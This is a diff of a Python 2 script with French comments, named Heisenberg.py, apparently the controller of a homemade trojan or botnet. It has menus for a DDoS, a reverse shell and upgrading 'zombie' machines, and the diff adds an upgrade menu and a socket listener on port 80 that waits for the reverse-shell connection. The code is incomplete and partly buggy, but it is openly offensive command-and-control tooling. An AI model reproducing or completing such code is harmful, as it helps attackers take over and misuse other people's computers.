@@ -93,6 +93,8 @@ import os, re, socket, threading
 choix=""
 #Listes de toutes les possibilité d'input par l'utilisateur
 possibilite = ["","M","D","S","U","Q","m"]
+bind_ip=""
+bind_port=80
 
 ##################################################################
 #DEFINITION DES FONCTIONS
@@ -205,7 +207,7 @@ def menu_DDOS () :
 	
 	#Si l'utilsateur tape M retour au menu principal
 	if IP_ddos == "M" or IP_victime =="m" :
-		print loop_input ()
+		print loop_input (choix)
 	#Vérification de la saisi de l'adresse IP
 	elif is_valid_ip(IP_ddos) == True :
 		print "l'adresse ip est correcte"
@@ -228,7 +230,7 @@ def menu_Rshell () :
 	
 	#Retour au menu principal
 	if IP_Rshell == "M" or IP_Rshell =="m" :
-		print loop_input ()
+		print loop_input (choix)
 
 	#Vérification de la saisi de l'adresse IP
 	elif is_valid_ip(IP_Rshell) == True :
@@ -236,6 +238,34 @@ def menu_Rshell () :
 
 		#Lancement de l'attaque
 		print "Lancement du Reverse Shell"
+		#Lancement de fonction serveur en écoute sur le port 80
+		print serveur()
+
+	else :
+		#Demander une nouvelle saisi pour l'adresse IP
+		print "Erreur de saisi de l'adresse ip, resssayer : \n"
+
+#fonction d'affichage du menu pour l'upgrade
+def menu_Upgrade () :
+	cls() #Nettoyage du prompt
+	print "------Bienvenue dans le menu Upgrade du zombie------"
+	print "Aller on va mettre à jour cette merde...\n"
+	
+	#Saisi de l'utilisateur soit M ou l'adresse IP du zombie
+	IP_Upgrade = raw_input("Saisir l'ip du zombie ou M pour revenir au menu principal : \n")
+	
+	#Retour au menu principal
+	if IP_Upgrade == "M" or IP_Upgrade =="m" :
+		print loop_input (choix)
+
+	#Vérification de la saisi de l'adresse IP
+	elif is_valid_ip(IP_Upgrade) == True :
+		print "l'adresse ip est correcte"
+
+		#Lancement de l'attaque
+		print "Lancement du Reverse Shell"
+		#Lancement de fonction serveur en écoute sur le port 80
+		print serveur()
 
 	else :
 		#Demander une nouvelle saisi pour l'adresse IP
@@ -262,7 +292,7 @@ def loop_input (choix) :
 		#Dans le cas où l'utilisateur tape M
 		while choix == possibilite[1] :
 			print ("Retour au menu principal")
-			print menu_principal()	
+			print loop_input(choix)	
 
 		#Dans le cas où l'utilisateur tape D
 		while choix == possibilite[2] :
@@ -291,7 +321,7 @@ def loop_input (choix) :
 			choix = str.upper(raw_input("Saisir le menu désiré : \n"))
 
 #Fonction principal du programme
-def main () :
+def serveur () :
 	# socket creation en écoute sur toutes les cartes réseau 0.0.0.0 sur le port 80
 	bind_ip = "" 
 	bind_port = 80  
@@ -299,8 +329,12 @@ def main () :
 	print ("Création du Socket")
 	#Création du socket en ipv4 et TCP
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-	server.bind((bind_ip,bind_port))  
+	server.bind((bind_ip,bind_port))
+	print ("Le serveur est en écoute sur le port %s") %bind_port  
+	#nombre de demandes de connexion max au moment de la demande
 	server.listen(5) 
+	#
+	connexion_client, infos_connexion = server.accept()
 
 
 ######################################################################
@@ -313,7 +347,6 @@ print ("#@ $$$$ : Heisenberg.py")
 print ("#@ date : 25/03/2016")
 print ("[*] Trojan ok - listening on %s:%d") %(bind_ip,bind_port)
 print ("#----------------------------------------------------#")
-
  
 
 print loop_input(choix)
